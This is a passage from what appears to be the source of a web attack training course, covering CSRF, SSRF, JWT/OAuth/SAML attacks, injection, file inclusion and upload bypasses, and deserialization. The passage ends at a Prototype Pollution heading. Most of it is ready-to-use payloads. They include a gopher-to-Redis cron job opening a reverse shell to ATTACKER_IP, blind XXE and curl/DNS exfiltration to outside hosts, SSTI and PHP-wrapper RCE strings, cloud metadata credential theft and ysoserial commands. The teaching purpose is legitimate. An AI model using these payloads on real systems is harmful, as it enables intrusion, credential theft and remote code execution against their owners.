    content: (
      <div>
        <P>Request forgery vulnerabilities force servers or browsers to make requests on behalf of attackers. CSRF (Cross-Site Request Forgery) tricks browsers into making requests. SSRF (Server-Side Request Forgery) tricks servers into making requests. Both can lead to privilege escalation and RCE in cloud environments.</P>
        <H3>CSRF Fundamentals and Bypass</H3>
        <Pre label="// CSRF ATTACK AND TOKEN BYPASS">{`# CSRF: attacker tricks authenticated victim's browser into making a request
# Works because browsers automatically include cookies with same-origin requests

# Basic CSRF HTML form (attacker hosts on evil.com):
# <form action="https://TARGET_URL/account/change-email" method="POST">
#   <input type="hidden" name="email" value="attacker@evil.com">
# </form>
# <script>document.forms[0].submit()</script>

# Token bypass 1: token not validated at all
# Remove the csrf_token parameter entirely - if it works = no validation

# Token bypass 2: token tied to session, not per-request
# Grab your own valid CSRF token and use it in the attack
# Works if the server only checks "is this a valid token for any session"

# Token bypass 3: token validation skipped on certain methods
# Change POST to GET and move params to query string - some apps skip CSRF on GET

# Token bypass 4: Referer header validation only
# Add: Referer: https://TARGET_URL to your CSRF request
# Or: host a page at https://evil.com/TARGET_URL/ (Referer contains target domain)

# SameSite cookie bypass:
# SameSite=Lax (Chrome default): blocks cross-site POST but allows GET for top-level navigation
# SameSite=Strict: blocks all cross-site requests including GET
# Old browsers (IE11, old Safari): SameSite not enforced

# Subdomain-based SameSite bypass:
# SameSite=Lax only blocks CROSS-SITE (different eTLD+1)
# If you control a subdomain (sub.target.com) via XSS or takeover:
# sub.target.com and target.com are SAME-SITE -> SameSite bypassed`}</Pre>
        <H3>SSRF Fundamentals and Cloud Metadata</H3>
        <Pre label="// SSRF DETECTION AND CLOUD METADATA EXPLOITATION">{`# SSRF: web app fetches a URL supplied or influenced by the user
# Look for parameters: url=, src=, dest=, redirect=, uri=, path=, fetch=, load=, proxy=

# Basic SSRF test - use Burp Collaborator or interactsh:
url=http://YOUR_COLLABORATOR_URL.burpcollaborator.net
# If you see a DNS/HTTP ping in collaborator -> SSRF confirmed

# AWS IMDSv1 - CRITICAL (no token required):
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name, then:
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME_HERE
# Returns: AccessKeyId, SecretAccessKey, Token
# Use these with aws cli: aws s3 ls --profile STOLEN

# AWS IMDSv2 - requires token (but SSRF can still get it):
# First request:
# PUT http://169.254.169.254/latest/api/token
# Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
# Response: TOKEN_VALUE
# Second request:
# GET http://169.254.169.254/latest/meta-data/
# Header: X-aws-ec2-metadata-token: TOKEN_VALUE
# Most SSRF vulnerabilities cannot chain PUT -> GET easily (depends on vuln class)

# GCP metadata:
url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires header: Metadata-Flavor: Google (often possible via header injection)

# Azure metadata:
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true`}</Pre>
        <H3>SSRF Filter Bypass - IP Representations</H3>
        <Pre label="// SSRF BYPASS TECHNIQUES">{`# Blocking 127.0.0.1? Try equivalent representations:
http://2130706433           # decimal IP for 127.0.0.1
http://0x7f000001           # hex IP for 127.0.0.1
http://0177.0000.0000.0001  # octal for 127.0.0.1
http://[::1]                # IPv6 loopback
http://[::ffff:127.0.0.1]   # IPv4-mapped IPv6
http://127.1                # shorthand, resolves to 127.0.0.1
http://127.0.1              # another shorthand

# Blocking 169.254.x.x? Try:
http://169.254.169.254.nip.io     # DNS resolves to 169.254.169.254
http://2852039166                 # decimal of 169.254.169.254
http://0xa9fea9fe                 # hex of 169.254.169.254

# Domain redirect bypass:
# Register domain that redirects to 169.254.169.254
# Some filters only check the domain, not the resolved IP

# URL parsing inconsistency bypass:
# @-symbol trick: https://evil.com@169.254.169.254/
# Some parsers see host as evil.com, some see 169.254.169.254
# Fragment trick: https://169.254.169.254#@evil.com

# Protocol bypass:
# dict://127.0.0.1:11211/     # Redis/Memcached via DICT protocol
# gopher://127.0.0.1:6379/_*1 # Gopher protocol can send raw TCP data
# file:///etc/passwd           # local file read via SSRF`}</Pre>
        <H3>SSRF to RCE via Internal Services</H3>
        <Pre label="// SSRF PIVOTING TO INTERNAL SERVICES">{`# SSRF + Redis = RCE (Redis has no auth by default on many installs)
# Use Gopher protocol to send raw Redis commands:
# Gopher URL that writes a cron job via Redis:
url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2431%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1%0a%0a%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2416%0d%0a/var/spool/cron/%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%244%0d%0aroot%0d%0a*1%0d%0a%244%0d%0asave%0d%0a

# SSRF + Elasticsearch (no auth default):
url=http://127.0.0.1:9200/            # list indices
url=http://127.0.0.1:9200/_cat/indices
url=http://127.0.0.1:9200/INDEX_NAME/_search?pretty

# SSRF + internal admin panel:
url=http://127.0.0.1:8080/admin/      # common internal admin port
url=http://172.16.0.1:3000/           # Grafana internal
url=http://10.0.0.1:8500/             # Consul

# SSRF via PDF generator:
# Many apps have "generate PDF of this page" features
# The PDF generator fetches the URL server-side
# Payload: <img src="http://169.254.169.254/latest/meta-data/">
# Or: <script>document.write(window.location)</script> (some renderers execute JS)

# SSRF via webhooks:
# App lets you set a webhook URL "where we'll POST results"
# Enter: http://169.254.169.254/ as webhook URL
# App makes outbound request to metadata service on your behalf

# Blind SSRF (no response body returned):
# Use Burp Collaborator or interactsh.com
# interactsh: curl -s https://app.interactsh.com/api/v1/register -d '{"public-key": "..."}'
# Shortcut: use https://RANDOM.oast.fun URLs (free, no registration)`}</Pre>
        <Note type="tip">Open redirects can be used as SSRF enablers. If the application has an open redirect at TARGET_URL/redirect?url=DEST and SSRF checking only validates the initial URL, chain them: SSRF parameter = TARGET_URL/redirect?url=http://169.254.169.254 - the server follows the redirect to the metadata service.</Note>
      </div>
    ),
  },
  {
    id: 'wa-05',
    title: 'Authentication and Session Attacks',
    difficulty: 'INTERMEDIATE',
    readTime: '16 min',
    labLink: '/modules/web-attacks/lab',
    takeaways: [
      'JWT none algorithm and RS256->HS256 confusion are trivial to exploit but often still present in older apps',
      'OAuth redirect_uri manipulation that exfiltrates the authorization code is game over for the victim account',
      'MFA fatigue (push bombing) requires no technical skill and has succeeded against Uber, Twilio, and Okta',
      'Password reset host header injection redirects reset tokens to attacker-controlled domains',
      'Timing attacks on auth systems reveal valid usernames even when the app returns identical error messages',
    ],
    content: (
      <div>
        <P>Authentication vulnerabilities are the keys to the kingdom. A broken auth system can render all other security controls irrelevant. This chapter covers modern auth attack surfaces - JWT, OAuth, SAML, MFA bypass, and session management flaws.</P>
        <H3>JWT Complete Attack Surface</H3>
        <Pre label="// JWT ATTACKS WITH JWT_TOOL">{`# JWT structure: header.payload.signature
# All three parts are base64url encoded
# Decode: echo "PART_HERE" | base64 -d

# Install jwt_tool:
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt

# Test all attacks automatically:
python3 jwt_tool.py TOKEN_HERE -T

# Attack 1: None algorithm (remove signature verification)
python3 jwt_tool.py TOKEN_HERE -X a
# Manually: change alg to "none", remove signature, keep trailing dot

# Attack 2: RS256 to HS256 (algorithm confusion)
# If server uses RS256 (asymmetric), expose public key (/.well-known/jwks.json or /api/auth/public-key)
# Sign token with HS256 using the PUBLIC KEY as the HMAC secret
# Server may verify HS256 with the public key (thinking it's the shared secret)
python3 jwt_tool.py TOKEN_HERE -X k -pk public.pem

# Attack 3: Brute force weak HMAC secret
python3 jwt_tool.py TOKEN_HERE -C -d /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 TOKEN_HERE /usr/share/wordlists/rockyou.txt

# Attack 4: kid (key ID) SQL injection
# Header: {"alg":"HS256","kid":"1"}
# If app does: SELECT key FROM secrets WHERE id = kid
# kid: "1 UNION SELECT 'attack_secret'--"
# Sign token with 'attack_secret' as HMAC key

# Attack 5: kid path traversal
# kid: "../../dev/null"   -> key is empty string -> sign with ""
# kid: "../../etc/passwd" -> key is /etc/passwd contents

# Attack 6: jku/x5u SSRF injection
# jku header: URL where server fetches public key
# {"alg":"RS256","jku":"https://ATTACKER_IP/jwks.json"}
# Host your own JWKS with your key -> server verifies with your public key
# Sign with your private key = forged token accepted`}</Pre>
        <H3>OAuth 2.0 Attack Surface</H3>
        <Pre label="// OAUTH 2.0 ATTACKS">{`# OAuth flow: client -> auth server -> redirect with code -> token exchange -> API
# Authorization Code flow (most common):
# 1. App redirects to: accounts.example.com/oauth/authorize?
#    client_id=APP_ID&redirect_uri=https://TARGET_URL/callback&state=RANDOM&scope=email

# Attack 1: state parameter CSRF
# state= should be random and validated to prevent CSRF on the OAuth callback
# If state is absent or predictable:
# Craft auth URL with no state -> victim visits -> auth code delivered to your controlled URI

# Attack 2: redirect_uri manipulation
# App whitelists: https://target.com/callback
# Try: https://target.com/callback/../../../ (path traversal)
# Try: https://target.com.evil.com/callback (domain confusion)
# Try: https://target.com/callback?extra=param (if open redirect exists at /callback)
# Try: https://target.com%0d%0a@evil.com/     (newline injection)
# If redirect goes to your server: you receive the auth CODE in URL -> steal account

# Attack 3: implicit flow token theft
# Implicit flow: token delivered in URL fragment #token=VALUE
# If page loads attacker-controlled subresource -> Referer leaks token
# If page has open redirect -> redirect to attacker server with fragment preserved

# Attack 4: authorization code interception
# If app uses custom URI scheme on mobile (myapp://callback?code=X)
# Other apps can register same scheme on Android -> intercept auth code

# Attack 5: PKCE absent
# PKCE (Proof Key for Code Exchange) prevents code interception
# Without PKCE, stolen auth code can be exchanged for token without proof

# Check for missing state:
# Visit: accounts.example.com/oauth/authorize?client_id=X&redirect_uri=Y (no state)
# If authorisation proceeds -> CSRF possible`}</Pre>
        <H3>SAML Attacks</H3>
        <Pre label="// SAML VULNERABILITY EXPLOITATION">{`# SAML: XML-based SSO. IdP (identity provider) signs XML assertions
# SP (service provider) trusts assertions from IdP if signature is valid

# Attack 1: XML Signature Wrapping (XSW)
# SAML assertion contains a valid signature, but also attacker-controlled data
# Parser reads attacker data but verifier checks legit signed portion
# They are in different parts of the XML tree = bypasses signature verification

# Attack 2: Comment injection
# If parser ignores XML comments:
# admin<!- -@evil.com -> parser sees "admin" before comment = admin account
# Works if SP parses username naively

# Attack 3: XXE via SAML
# SAML assertions are XML -> inject XXE entities into the assertion:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# <saml:Attribute>PAYLOAD: &xxe;</saml:Attribute>

# Tools:
# SAML Raider (Burp extension): intercept/modify SAML assertions in real-time
# samlmap: automated SAML vulnerability scanner`}</Pre>
        <H3>Password Reset and MFA Bypass</H3>
        <Pre label="// PASSWORD RESET AND MFA ATTACKS">{`# Password reset host header injection:
# Vulnerable app builds reset link from Host header:
# "Click: https://HOST_HEADER/reset?token=TOKEN"
# Inject: Host: evil.com
# Victim receives: https://evil.com/reset?token=TOKEN -> token goes to attacker

# Password reset token analysis:
# Collect many reset tokens, look for patterns
# If token = timestamp + username hash = predictable
# Sequencer in Burp: capture token-generation requests, analyse entropy

# Account lockout bypass:
# X-Forwarded-For: 1.2.3.4  (rotate each request to bypass IP limits)
# X-Real-IP, X-Client-IP, True-Client-IP, CF-Connecting-IP
# Use Burp Intruder with IP rotation list in X-Forwarded-For header

# Race condition in password reset (use two tokens simultaneously):
# Request token for account A at time T
# Request token for account A at time T+1ms
# If server generates tokens based on time -> identical or predictable

# MFA Fatigue (push bombing):
# Attacker has valid credentials (from breach/phish) but no MFA device
# Trigger 50+ push notifications in rapid succession at 2-3am
# Victim accidentally approves or approves to stop notifications
# Used against: Uber (2022), Twilio, Okta, Cisco

# MFA backup code abuse:
# If account has backup codes stored in plaintext on server
# SSRF or SQLi -> read backup codes -> login as victim

# SS7 / SIM swapping:
# SS7 vulnerabilities allow intercepting SMS OTP codes at network level
# SIM swapping: social-engineer telco to port victim's number to attacker SIM
# Both defeat SMS-based MFA entirely`}</Pre>
        <H3>Session Analysis</H3>
        <Pre label="// SESSION SECURITY ANALYSIS">{`# Session token entropy test via Burp Sequencer:
# Proxy > HTTP history > right-click login response > Send to Sequencer
# Start live capture -> collects tokens automatically
# Analyse: FIPS 140-2 tests on bit distribution
# Result below 50 bits effective entropy = predictable/guessable

# Session fixation:
# 1. Attacker gets a session token (unauthenticated): SESS_ID=123
# 2. Attacker tricks victim into using that token (URL param, subdomains, etc.)
# 3. Victim logs in - if server keeps SESS_ID=123 after login = fixed
# 4. Attacker uses SESS_ID=123 -> now authenticated as victim
# Fix: server must regenerate session ID on privilege escalation (login)

# Cookie security flags analysis:
# Secure: cookie only sent over HTTPS
# HttpOnly: not accessible via document.cookie (XSS protection)
# SameSite: CSRF protection
# Domain: broad domain attribute expands cookie scope
# Test: check all session cookies in DevTools > Application > Cookies`}</Pre>
        <Note type="warn">Authentication timing attacks: measure response time differences for valid vs invalid usernames. Even if error messages are identical, a 5ms difference in response time (bcrypt vs early-exit) reveals valid usernames. Use Burp Intruder with response time column to identify valid accounts.</Note>
      </div>
    ),
  },
  {
    id: 'wa-06',
    title: 'Injection Attacks Beyond SQL',
    difficulty: 'ADVANCED',
    readTime: '18 min',
    labLink: '/modules/web-attacks/lab',
    takeaways: [
      'SSTI is among the most severe injection classes - Jinja2 and Twig SSTI typically leads directly to RCE',
      'Command injection via $IFS and wildcard expansion bypasses space and special char filters',
      'XXE via DOCX/XLSX is common because developers forget Word files are ZIP archives of XML',
      'Log poisoning chains LFI with log injection: inject PHP into User-Agent, then include the log file',
      'tplmap automates SSTI detection and exploitation across all major template engines',
    ],
    content: (
      <div>
        <P>Injection vulnerabilities extend far beyond SQL. Any time user input is embedded into a language interpreter - template engines, OS shells, LDAP queries, XPath expressions, XML parsers - an injection vulnerability may exist. This chapter covers the full spectrum.</P>
        <H3>OS Command Injection</H3>
        <Pre label="// COMMAND INJECTION - DETECTION AND EXPLOITATION">{`# Occurs when user input is concatenated into a shell command
# Vulnerable code: exec("ping -c 1 " + user_input)

# Injection separators (Linux):
;           # run command after
&&          # run if first succeeds
||          # run if first fails
|           # pipe
NEWLINE     # new command (URL encode as %0a or %0d%0a)
BACKTICK    # subshell substitution (old shell style)
$(command)  # modern subshell substitution

# Windows separators:
&
&&
|
||
%0a         # newline (sometimes)

# Detection payloads:
; sleep 5
| sleep 5
&& sleep 5
$(sleep 5)
%0asleep%205

# Blind exfiltration via DNS:
; nslookup $(whoami).YOUR_COLLABORATOR_URL
; curl http://YOUR_COLLABORATOR_URL/$(id|base64 -w0)

# Filter bypass - space blocked:
{cat,/etc/passwd}   # bash brace expansion, no space
cat$IFS/etc/passwd    # IFS = internal field separator = space
cat</etc/passwd       # redirect without space
cat%09/etc/passwd     # tab instead of space (URL encoded)

# Filter bypass - slash blocked:
cat$HOME_SLICE_HERE/etc/passwd  # / via HOME variable substrings (HOME:0:1)
# HOME=/home/user -> first char = /

# Filter bypass - keyword blocked (e.g. "cat" blocked):
c''at /etc/passwd   # single quotes in middle
ca$TAB_HERE/etc/passwd # tab in middle of command`}</Pre>
        <H3>Server-Side Template Injection (SSTI)</H3>
        <Pre label="// SSTI DETECTION AND ENGINE IDENTIFICATION">{`# Template engines evaluate expressions like {{7*7}}
# If output shows 49 -> SSTI confirmed
# Detection polyglot (tests multiple engines):
*{7*7}  {{7*7}}  #{7*7}

# Engine identification decision tree:
# Input: {{7*7}}  Output: 49 -> Jinja2 or Twig or Freemarker
#   Input: {{7*'7'}}
#     Output: 7777777 -> Jinja2
#     Output: 49 -> Twig

# Input: DOLLAR{7*7}  (replace DOLLAR with actual dollar sign)
#   Output: 49 -> Freemarker or Velocity
#   Not evaluated -> try #{7*7} (Smarty)

# Jinja2 (Python/Flask) - RCE:
{{config}}                                         # info leak
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}       # find Popen
# Full RCE payload via Popen:
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
# Note: index 396 varies - search for subprocess.Popen in subclasses list

# Twig (PHP) - RCE:
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# Freemarker (Java) - RCE (use dollar-brace in real payload):
DOLLAR{"freemarker.template.utility.Execute"?new()("id")}
# via assignment:
<#assign ex="freemarker.template.utility.Execute"?new()>EXEC_HERE

# Velocity (Java):
#set($cmd = "id")
#set($runtime = $class.inspect("java.lang.Runtime").type)
$runtime.exec($cmd)

# tplmap - automated SSTI:
git clone https://github.com/epinna/tplmap
python3 tplmap.py -u "https://TARGET_URL/?name=PAYLOAD_HERE"
python3 tplmap.py -u "https://TARGET_URL/?name=PAYLOAD_HERE" --os-shell`}</Pre>
        <H3>XML External Entity (XXE) Injection</H3>
        <Pre label="// XXE COMPLETE EXPLOITATION">{`# XXE occurs when XML parser processes external entity references
# Any XML-consuming endpoint may be vulnerable

# Basic file read:
# <?xml version="1.0"?>
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# <root><data>&xxe;</data></root>

# Windows path:
# <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">

# XXE to SSRF:
# <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

# Blind XXE via parameter entities (out-of-band exfiltration):
# Payload sent to server:
# <?xml version="1.0"?>
# <!DOCTYPE foo [
#   <!ENTITY % file SYSTEM "file:///etc/passwd">
#   <!ENTITY % dtd SYSTEM "http://ATTACKER_IP/evil.dtd">
#   %dtd;
# ]>
# <foo>&exfil;</foo>

# evil.dtd hosted on ATTACKER_IP:
# <!ENTITY % all "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP/?data=%file;'>">
# %all;

# XXE via DOCX/XLSX (ZIP containing XML):
unzip document.docx -d docx_extracted/
# Edit docx_extracted/word/document.xml -> add XXE entity declaration at top
# Re-zip: cd docx_extracted && zip -r ../evil.docx .
# Upload evil.docx -> server parses XML -> XXE fires

# XXE via SVG upload:
# <?xml version="1.0"?>
# <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# <svg xmlns="http://www.w3.org/2000/svg">
# <text>&xxe;</text>
# </svg>

# XXE filter bypass techniques:
# UTF-16 encoding: iconv -f UTF-8 -t UTF-16LE payload.xml > payload_utf16.xml
# Some filters only check for "<!DOCTYPE" in UTF-8

# Billion Laughs DoS:
# <!DOCTYPE boom [
# <!ENTITY a "aaaaaaaaaaaa">
# <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
# <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
# ... ten levels deep
# ]>
# <root>&j;</root>
# Causes exponential memory expansion -> DoS`}</Pre>
        <H3>LDAP Injection</H3>
        <Pre label="// LDAP INJECTION">{`# LDAP directories used for authentication in many enterprises
# Vulnerable login: (&(uid=INPUT)(password=INPUT))

# Authentication bypass:
# Username: *)(uid=*))(|(uid=*
# Resulting filter: (&(uid=*)(uid=*))(|(uid=*)(password=pass))
# Returns all users = login bypass

# Data extraction (blind, character by character):
# (&(uid=admin)(password=a*))   -> check if password starts with 'a'
# (&(uid=admin)(password=ab*))  -> check if starts with 'ab'
# Iterate to extract full password

# Alternative auth bypass payloads:
admin)(&)
*)(objectClass=*)
admin)(!(&(1=0`}</Pre>
        <H3>Log Injection and Log Poisoning to RCE</H3>
        <Pre label="// LOG POISONING VIA LFI">{`# Requires: LFI vulnerability + ability to write to log files

# Step 1: Inject PHP into a log file via User-Agent:
curl -A "" https://TARGET_URL/

# Step 2: Include the log file via LFI to execute PHP:
# LFI: TARGET_URL/page?file=../../../var/log/apache2/access.log
# PHP in log executes -> RCE

# SSH log poisoning:
ssh "" TARGET_HOST
# Injects PHP into /var/log/auth.log
# LFI path: /var/log/auth.log or /var/log/syslog

# Nginx log location: /var/log/nginx/access.log
# Apache log location: /var/log/apache2/access.log

# Email header injection:
# Vulnerable code: mail("admin@target.com", "Subject", "Body", "From: " + user_input)
# Inject: attacker@evil.com\r\nCC:victim@target.com
# Or BCC: to spam via legitimate mail server`}</Pre>
        <Note type="tip">HTML injection vs XSS: HTML injection lets you inject tags but not scripts (when CSP or output encoding blocks scripts). HTML injection enables phishing: inject a fake login form that submits to your server. The page looks legitimate because it loads from the real domain.</Note>
      </div>
    ),
  },
  {
    id: 'wa-07',
    title: 'File Inclusion, Upload and Path Traversal',
    difficulty: 'ADVANCED',
    readTime: '16 min',
    labLink: '/modules/web-attacks/lab',
    takeaways: [
      'PHP wrappers (php://filter, php://input, data://) massively expand LFI impact beyond simple file reading',
      'LFI-to-RCE via log poisoning requires only LFI + writable log + PHP execution - no upload needed',
      'Magic bytes bypass is reliable: prepend GIF89a to any PHP payload and it passes most image checks',
      'Zip Slip exploits archive extraction: malicious paths like ../../evil.php extract to arbitrary locations',
      'ImageTragick (CVE-2016-3714) remains present in legacy stacks - check ImageMagick version on all upload targets',
    ],
    content: (
      <div>
        <P>File-related vulnerabilities - inclusion, upload, and path traversal - are among the most impactful in web security. A successful file upload bypass often leads directly to Remote Code Execution. LFI can expose source code, credentials, and private keys. Path traversal can read any file the web server process can access.</P>
        <H3>Local File Inclusion (LFI)</H3>
        <Pre label="// LFI DETECTION AND EXPLOITATION">{`# LFI: including local files via user-controlled path parameter
# Vulnerable code: include($_GET['page'] . '.php');
# or:              readfile($_GET['file']);

# Basic traversal:
?page=../../../../../../etc/passwd
?page=....//....//....//etc/passwd    # filter bypass
?page=..%2F..%2F..%2Fetc%2Fpasswd    # URL encoded
?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd # double URL encoded
?page=....\/....\/etc/passwd          # mixed slash

# Null byte injection (PHP < 5.3.4):
?page=../../etc/passwd%00
?page=../../etc/passwd%00.jpg         # bypasses .php appended by code

# Interesting files to read:
# Linux:
/etc/passwd         # user accounts
/etc/shadow         # hashed passwords (root only)
/etc/hosts          # hostname mappings
/proc/self/environ  # environment vars (may contain secrets)
/proc/self/cmdline  # process command line
/var/www/html/config.php  # DB credentials
~/.ssh/id_rsa       # SSH private key
~/.bash_history     # command history

# Windows:
C:/Windows/win.ini
C:/Windows/System32/drivers/etc/hosts
C:/inetpub/wwwroot/web.config
C:/xampp/apache/conf/httpd.conf`}</Pre>
        <H3>PHP Wrappers</H3>
        <Pre label="// PHP WRAPPERS - EXPAND LFI IMPACT">{`# php://filter - read source code (base64 encoded to avoid parsing):
?page=php://filter/convert.base64-encode/resource=/var/www/html/config.php
# Decode output: echo "BASE64_HERE" | base64 -d

# Chain filters:
?page=php://filter/read=string.rot13/convert.base64-encode/resource=index.php

# php://input - execute PHP from POST body:
# (Requires allow_url_include = On, PHP < 7)
# POST body: <?php system('id'); ?>
?page=php://input

# data:// URI - execute inline PHP:
?page=data://text/plain,<?php system('id');?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# expect:// wrapper - direct command execution:
# (Requires expect extension installed)
?page=expect://id

# zip:// - execute from uploaded zip:
# Upload a zip containing shell.php
?page=zip://uploads/archive.zip%23shell`}</Pre>
        <H3>LFI to RCE Paths</H3>
        <Pre label="// LFI TO RCE - MULTIPLE METHODS">{`# Method 1: /proc/self/environ
# If proc/self/environ is readable and User-Agent is stored there:
curl -H "User-Agent: " https://TARGET_URL/
# Include: ?page=../../../proc/self/environ

# Method 2: Apache / Nginx access log poisoning (covered in Ch6)
# Inject PHP into User-Agent -> include access.log

# Method 3: PHP session file
# PHP session stored in /var/lib/php/sessions/sess_SESSIONID
# Control session data: set username to PHP payload via login form
# Include: ?page=../../../var/lib/php/sessions/sess_SESSIONID

# Method 4: Email / mail log
# Send email with PHP payload in Subject line to local user
# Include mail log: /var/mail/www-data or /var/spool/mail/www-data

# Method 5: Upload + LFI combination
# Upload an image with PHP payload in metadata (EXIF or comment field)
# exiftool -Comment="" photo.jpg
# Include the uploaded image path via LFI - PHP executes embedded code`}</Pre>
        <H3>File Upload Bypass Techniques</H3>
        <Pre label="// FILE UPLOAD BYPASS - COMPLETE HIERARCHY">{`# Layer 1: Client-side validation
# Bypass: Intercept with Burp after file selected, modify before send
# Or: disable JavaScript in browser before selecting file

# Layer 2: Extension blacklist (blocks .php, .asp, .aspx)
# Alternative extensions (PHP): .php3 .php4 .php5 .php7 .phtml .pht .phar .phps
# Alternative extensions (ASP): .asp .aspx .cer .asa .ashx .ascx .asmx .aspq
# Double extension: shell.php.jpg  (if server serves based on FIRST extension)
# Windows alternate data streams: shell.php::$DATA
# Null byte: shell.php%00.jpg (PHP < 5.3)

# Layer 3: MIME type (Content-Type header) check
# Change Content-Type to: image/jpeg, image/png, image/gif
# Keep PHP content in body - server validates header only

# Layer 4: Magic bytes check
# JPEG magic: FF D8 FF E0
# PNG magic:  89 50 4E 47 0D 0A 1A 0A
# GIF magic:  47 49 46 38 39 61 (GIF89a)
# Prepend magic bytes to PHP payload:
printf 'GIF89a' > polyglot.php && echo '' >> polyglot.php
# Now polyglot.php is a valid GIF header followed by PHP code

# Layer 5: Image processing validation (getimagesize() in PHP)
# Create actual valid image with PHP in EXIF comment:
convert -comment "" valid.jpg output.php.jpg
exiftool -Comment="" image.jpg -o shell.php.jpg

# Zip Slip (path traversal in archives):
# Create zip where file path contains ../
python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.write('shell.php', '../../var/www/html/shell.php')
"
# Upload evil.zip to target that extracts archives

# ImageMagick ImageTragick (CVE-2016-3714):
# Malicious .mvg or .svg file executes commands when ImageMagick processes it:
# push graphic-context
# viewbox 0 0 640 480
# fill 'url(https://127.0.0.1/image.png"|id; echo ")'
# pop graphic-context
# Save as evil.mvg, upload to any image processing endpoint`}</Pre>
        <H3>Directory Traversal</H3>
        <Pre label="// PATH TRAVERSAL COMPLETE BYPASS GUIDE">{`# Basic traversal:
/download?file=../../../etc/passwd
/read?path=/var/www/html/../../../etc/passwd

# Filter bypass techniques:
# Double dot encoded:
..%2f..%2f..%2fetc%2fpasswd     # URL encode slashes
%2e%2e%2f%2e%2e%2f              # encode dots too
%2e%2e%5c%2e%2e%5c              # Windows backslash encoded

# Nested traversal (filter removes ../ once):
....//....//....//etc/passwd    # after removal: ../../etc/passwd still works
..%2f%2e%2e%2f                  # mixed encoding

# Windows UNC paths:
\\attacker_ip\share\shell.exe   # can trigger Net-NTLM hash capture

# Null byte (PHP < 5.3):
../../../etc/passwd%00.jpg      # truncates .jpg appended by code

# Absolute path (when traversal is not needed):
/file?path=/etc/passwd          # try absolute path directly`}</Pre>
        <Note type="danger">Polyglot files are valid images that also contain executable code. A GIF89a header followed by PHP is a real concern in legacy PHP apps with image uploads - the file passes getimagesize() checks but executes as PHP if included or served from an executable directory.</Note>
      </div>
    ),
  },
  {
    id: 'wa-08',
    title: 'Deserialization, Prototype Pollution and Advanced',
    difficulty: 'ADVANCED',
    readTime: '18 min',
    labLink: '/modules/web-attacks/lab',
    takeaways: [
      'Java deserialization via ysoserial gadget chains is RCE from a base64 blob - look for rO0AB prefix in cookies',
      'HTTP request smuggling (desync) can bypass front-end WAFs entirely and capture other users requests',
      'Web cache poisoning via unkeyed headers can deliver XSS to every visitor of a high-traffic page',
      'Server-side prototype pollution in Node.js allows injecting properties into all objects in the runtime',
      'IDOR with GUIDs is still testable via API response analysis - apps often return UUIDs in one endpoint but not another',
    ],
    content: (
      <div>
        <P>Advanced web vulnerabilities require deep understanding of how applications process data. Deserialization flaws turn data into code. HTTP smuggling exploits protocol parsing differences. Cache poisoning weaponises performance infrastructure. These are the techniques that separate novice testers from expert researchers.</P>
        <H3>Insecure Deserialization</H3>
        <Pre label="// DESERIALIZATION ATTACKS BY LANGUAGE">{`# DETECTION: look for serialized object signatures
# Java:   rO0AB (base64) or hex AC ED 00 05
# PHP:    O:x:"ClassName":y:{...}  or a:x:{...} (arrays)
# .NET:   AAEAAAD// (base64) for BinaryFormatter
# Python: base64 of bytes starting with 0x80 0x03 (pickle)

# JAVA DESERIALIZATION - ysoserial:
git clone https://github.com/frohoff/ysoserial
# List available gadget chains:
java -jar ysoserial.jar 2>&1 | head -50

# Generate payload for different chains:
java -jar ysoserial.jar CommonsCollections5 "id" | base64 -w0
java -jar ysoserial.jar Spring1 "id" | base64 -w0
java -jar ysoserial.jar CommonsCollections6 "id" | base64 -w0

# Test each chain - different versions of commons-collections are on different servers
# Common chains to try: CC1-7, Spring1/2, Hibernate1, FileUpload1, ROME

# Burp extension: Java Deserialization Scanner
# Intercept request containing serialized data -> scan with extension -> auto-tests all chains

# PHP DESERIALIZATION:
# Vulnerable: $obj = unserialize($_COOKIE['data']);
# PHP magic methods called on deserialize:
# __wakeup() - called after unserialize
# __destruct() - called when object is garbage collected
# __toString() - called when object cast to string

# Construct POP chain:
# O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"file";s:11:"/etc/passwd";}
# O:8:"LogClass":1:{s:9:"log_file";s:24:"/var/www/html/output.php";}

# PYTHON PICKLE:
# Vulnerable: obj = pickle.loads(user_data)
# Exploit via __reduce__:
# class Exploit:
#     def __reduce__(self):
#         import os
#         return (os.system, ('id',))
# payload = pickle.dumps(Exploit())
# base64.b64encode(payload)

# .NET BinaryFormatter (ViewState):
# Look for __VIEWSTATE parameter in ASP.NET pages
# If MAC validation disabled -> deserialize arbitrary data
# Tool: ysoserial.net for .NET gadget chain generation`}</Pre>
        <H3>Prototype Pollution</H3>
